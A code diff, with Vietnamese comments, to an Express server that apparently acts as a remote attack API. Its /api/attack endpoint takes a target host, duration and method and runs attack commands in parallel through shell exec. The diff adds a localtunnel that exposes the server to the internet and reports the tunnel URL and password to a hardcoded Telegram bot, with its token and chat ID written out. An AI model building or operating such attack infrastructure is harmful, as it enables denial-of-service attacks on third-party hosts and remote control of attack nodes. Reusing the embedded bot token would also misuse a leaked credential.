@@ -1,11 +1,17 @@
 const express = require("express");
 const { exec } = require("child_process");
+const localtunnel = require("localtunnel");
+const axios = require("axios");
 const app = express();
-const port = 9995;
 const MAX_CONCURRENT_ATTACKS = 1;
 
 let activeAttacks = 0;
 let currentPID = null;
+
+// Hàm tạo cổng ngẫu nhiên
+const getRandomPort = () => {
+  return Math.floor(Math.random() * (65535 - 1024) + 1024);
+};
 
 const validateInput = ({ key, host, time, method, port }) => {
   if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
@@ -45,6 +51,55 @@ const executeAllAttacks = (methods, host, time) => {
 
   // Thực thi tất cả các lệnh tấn công song song mà không chờ kết quả
   commands.forEach(executeAttack);
+};
+
+// Hàm gửi tin nhắn đến Telegram bot
+const sendTelegramMessage = async (message) => {
+  const token = "7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw";
+  const chatId = "7371969470";
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  try {
+    await axios.post(url, {
+      chat_id: chatId,
+      text: message,
+    });
+  } catch (error) {
+    console.error("Lỗi khi gửi tin nhắn đến Telegram:", error);
+  }
+};
+
+// Hàm lấy mật khẩu từ localtunnel
+const getLocaltunnelPassword = async () => {
+  try {
+    const response = await axios.get("https://loca.lt/mytunnelpassword");
+    return response.data.trim(); // Trả về mật khẩu đã được cắt bỏ khoảng trắng thừa
+  } catch (error) {
+    console.error("Lỗi khi lấy mật khẩu từ localtunnel:", error);
+    return null;
+  }
+};
+
+// Khởi động server với cổng ngẫu nhiên
+const startServer = async () => {
+  const port = getRandomPort();
+  const tunnel = await localtunnel({ port });
+
+  // Lấy mật khẩu từ localtunnel
+  const password = await getLocaltunnelPassword();
+
+  app.listen(port, () => {
+    console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`);
+    console.log(`[LOCALTUNNEL] URL: ${tunnel.url}`);
+
+    // Gửi URL và mật khẩu đăng nhập về Telegram
+    const message = `API Server đã khởi động:\nURL: ${tunnel.url}\nMật khẩu: ${password}`;
+    sendTelegramMessage(message);
+  });
+
+  tunnel.on("close", () => {
+    console.log("Localtunnel đã đóng.");
+  });
 };
 
 app.get("/api/attack", (req, res) => {
@@ -90,4 +145,5 @@ app.get("/api/attack", (req, res) => {
   }
 });
 
-app.listen(port, () => console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`));
+// Khởi động server
+startServer();
